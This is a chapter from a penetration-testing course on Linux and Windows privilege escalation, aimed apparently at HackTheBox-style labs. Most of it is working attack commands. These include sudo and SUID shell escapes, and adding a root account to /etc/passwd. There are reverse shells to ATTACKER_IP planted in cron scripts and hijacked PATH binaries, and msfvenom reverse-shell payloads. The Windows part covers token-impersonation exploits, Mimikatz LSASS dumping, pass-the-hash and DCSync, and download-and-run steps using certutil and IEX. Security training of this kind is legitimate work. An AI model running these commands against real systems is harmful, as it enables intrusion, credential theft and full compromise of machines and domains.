---
title: "Privilege Escalation"
subtitle: "Linux and Windows privesc techniques — SUID binaries, sudo misconfigs, kernel exploits, service account abuse, token impersonation."
chapter: 9
level: "intermediate"
readingTime: "16 min"
topics: ["privilege escalation", "SUID", "sudo", "Linux privesc", "Windows privesc", "token impersonation", "kernel exploit"]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

Getting a shell as a low-privilege user is like getting a visitor badge — you're in the building but can't access the server room. Privilege escalation is finding the key card someone left in an unlocked desk drawer.

</Callout>

## The Privesc Mindset

Never assume you're stuck at low privilege. Privesc is methodical enumeration:

```
1. Gather system info — OS version, kernel, architecture
2. Enumerate users, groups, sudo rights
3. Find SUID/SGID binaries
4. Check writable files and directories
5. Review running processes and services
6. Inspect cron jobs
7. Look for credentials in configs, env vars, history
8. Check installed software versions (kernel, services)
9. Search for writable PATH exploits
```

## Linux Privilege Escalation

### Initial Enumeration

```bash
# System info
uname -a            # kernel version — check for kernel exploits
cat /etc/os-release
arch                # x86_64 or i686

# Current user and context
id                  # uid, gid, groups
whoami
sudo -l             # what can I run as root?
groups

# Other users
cat /etc/passwd | grep -v nologin | grep -v false  # active users
cat /etc/shadow   # if readable — hash cracking time
ls -la /home      # what home dirs exist?

# Environment
env
echo $PATH
history           # command history may contain passwords
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.ssh/known_hosts   # what hosts does this user connect to?
ls ~/.ssh/                # any private keys?
```

### sudo Misconfigurations

```bash
sudo -l
# Example outputs:

# NOPASSWD: any command → trivial root
User user may run the following commands:
    (root) NOPASSWD: ALL

# NOPASSWD: specific binary → check GTFOBins
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/python3
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/awk
```

**GTFOBins** (`gtfobins.github.io`) — documents sudo/SUID escalation for hundreds of binaries:

```bash
# vim as sudo
sudo vim -c ':!/bin/bash'
sudo vim -c ':set shell=/bin/bash' -c ':shell'

# python3 as sudo
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# find as sudo
sudo find . -exec /bin/bash \; -quit

# awk as sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# less as sudo
sudo less /etc/passwd
# Inside less: !bash

# env as sudo
sudo env /bin/bash

# tee as sudo (read /etc/shadow or write to root-owned files)
echo "newroot::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```

### SUID Binary Exploitation

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Common misused SUID binaries:
# /usr/bin/nmap (old versions)
# /usr/bin/vim
# /usr/bin/find
# /usr/bin/python

# nmap --interactive (old versions < 5.2)
nmap --interactive
nmap> !sh

# Python SUID
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# -p flag: preserve SUID (don't drop privileges)

# find SUID
find . -exec /bin/sh -p \; -quit

# Check GTFOBins for any binary you find
```

### Writable /etc/passwd

```bash
# If /etc/passwd is world-writable (misconfiguration):
ls -la /etc/passwd

# Generate a password hash
openssl passwd -1 -salt hack hackme123
# $1$hack$hash...

# Add a root user
echo 'hacker:$1$hack$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su hacker
# password: hackme123
```

### Cron Job Exploitation

```bash
# List cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/ /etc/cron.daily/
crontab -l                # current user's crons
sudo crontab -l -u root  # root's crons (if sudo allows)

# Monitor cron execution (pspy — no root needed)
./pspy64   # watches process events — see what root runs

# If a cron script is world-writable:
ls -la /opt/backup.sh   # -rwxrwxr-x → writable by everyone

# Replace with reverse shell
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# Wait for cron to run as root → get root shell
```

### PATH Hijacking

```bash
# A sudo script or SUID binary calls a command without full path:
# sudo backup.sh contains: cp /home/* /backup

# Malicious cp in a directory before /usr/bin:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH
sudo backup.sh   # runs your /tmp/cp as root
```

### Kernel Exploits

Last resort — unstable, may crash the system:

```bash
# Find kernel version
uname -r
# 3.13.0-24-generic → very old

# Search for exploits
searchsploit linux kernel 3.13
searchsploit linux privilege escalation

# Common kernel exploits:
# DirtyCow (CVE-2016-5195) — Linux kernel < 4.8.3
# Rotten Potato / Juicy Potato (Windows)

# Automated suggester
# linux-exploit-suggester
curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
```

### Automated Tools

```bash
# LinPEAS — automated Linux privesc enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum — another comprehensive enumeration script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# pspy — process monitor without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64 && ./pspy64
```

## Windows Privilege Escalation

### Initial Enumeration

```powershell
# System info
systeminfo
whoami /all          # current user + groups + privileges
net user             # all local users
net localgroup administrators  # who's admin?

# Running services
sc query             # all services
net start            # running services
wmic service get name,displayname,pathname,startmode  # service paths

# Installed software
wmic product get name,version,vendor
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Network
ipconfig /all
route print
netstat -ano         # active connections with PIDs

# Scheduled tasks
schtasks /query /fo LIST /v
```

### Unquoted Service Paths

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '"'

# Example vulnerable path:
# C:\Program Files\Vulnerable Service\service.exe
# Windows tries:
#   C:\Program.exe                          → if exists, runs as SYSTEM
#   C:\Program Files\Vulnerable.exe         → if exists, runs as SYSTEM
#   C:\Program Files\Vulnerable Service\service.exe  (actual binary)

# Place malicious binary at writable location:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > "C:\Program Files\Vulnerable.exe"

# Restart service
sc stop VulnerableService
sc start VulnerableService
# Or wait for reboot
```

### AlwaysInstallElevated

```powershell
# Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 1 → any .msi installs as SYSTEM
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o shell.msi

# Execute on victim:
msiexec /quiet /qn /i shell.msi
```

### Token Impersonation

Windows tokens represent identity. Certain privileges allow stealing tokens from privileged processes:

```powershell
# Check privileges
whoami /priv

# Dangerous privileges:
# SeImpersonatePrivilege   → Juicy Potato, PrintSpoofer, RoguePotato
# SeAssignPrimaryToken     → same attacks
# SeBackupPrivilege        → read any file including SAM
# SeDebugPrivilege         → access any process memory (dump LSASS)
# SeLoadDriverPrivilege    → load kernel drivers (kernel exploits)
```

```bash
# PrintSpoofer — if SeImpersonatePrivilege
PrintSpoofer64.exe -i -c powershell

# JuicyPotato (Windows < 2019)
JuicyPotato.exe -l 4444 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# RoguePotato (Windows 2019+)
RoguePotato.exe -r 192.168.1.50 -e "cmd.exe" -l 9999
```

### Credential Dumping with Mimikatz

```powershell
# Mimikatz — extract Windows credentials from memory
# Requires SYSTEM or Administrator

mimikatz.exe

# Enable debug privilege
privilege::debug

# Dump plaintext passwords from LSASS (Win < 8.1 / old configs)
sekurlsa::logonpasswords

# Dump NTLM hashes
sekurlsa::msv

# Pass-the-Hash — authenticate with hash, no password needed
sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:HASH /run:cmd.exe

# Dump SAM database
lsadump::sam
lsadump::lsa /patch

# DCSync — pull all domain hashes from DC (Domain Admin needed)
lsadump::dcsync /domain:corp.local /user:Administrator
```

### WinPEAS — Automated Windows Enumeration

```powershell
# Download and run
certutil -urlcache -f http://ATTACKER_IP:8000/winPEASx64.exe winpeas.exe
.\winpeas.exe

# Or via PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/winPEAS.ps1')
```

## Real Project: HackTheBox — Basic Privesc Path

```bash
# Typical HTB Linux machine flow:
# 1. Get low-priv shell via web RCE or SSH with weak creds
# 2. Run linpeas → note red/yellow findings
# 3. Check sudo -l
# 4. If nothing obvious → check SUID binaries
# 5. Check cron with pspy
# 6. Search for config files with credentials
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
# 7. Check for world-writable scripts called by root processes
# 8. Check kernel version as last resort
```

